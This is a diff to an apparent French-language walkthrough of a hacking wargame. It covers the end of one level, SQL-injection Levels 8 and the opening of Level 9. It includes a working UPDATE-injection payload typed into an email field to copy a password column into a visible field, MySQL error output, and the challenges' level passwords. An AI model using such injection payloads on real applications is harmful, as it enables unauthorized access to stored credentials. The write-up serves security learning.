@@ -194,13 +194,39 @@ done
 done
 ```
 ==> TESTUSERFORG00GLE
+
 PB : pas de distinction majuscules/minuscules avec LOCATE :'-(
+
 utilisation de locate('$x',news.autor COLLATE latin1_general_cs,$i)=$i
+
 ==> TestUserforg00gle
+
  User correct.
 
 The password for the next level is: MOOcowMEOWcatOinkPIG 
 
 ##Level 8 : SQL-Injection
+Si on met une apostrophe dans le champ email à la fin de l'adresse existante, on obtient l'erreur :
+```sql
+ You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '12345', age = '25' WHERE id = 1' at line 3 Username: Admin
+```
+Dans les autres champs, l'apostrophe est échappée (\')
+
+Dans le champ email, on indique de remplacer le contenu du champ name par le champ password :
+```sql
+hans@localhost', name=password,icq='toto
+```
+Le champ Name contient : themeaningoflife42
+
+ Login correct. You are admin :); 
+ 
+ The password for the next level is: slap_the_lamerz_drink_some_beer 
+ 
 ##Level 9 : SQL-Injection
+
+On essaye le caractère ' dans chaque champ. Dans le textara, on obtient la sortie :
+```sql
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''')' 
+```
+
 ##Level 10
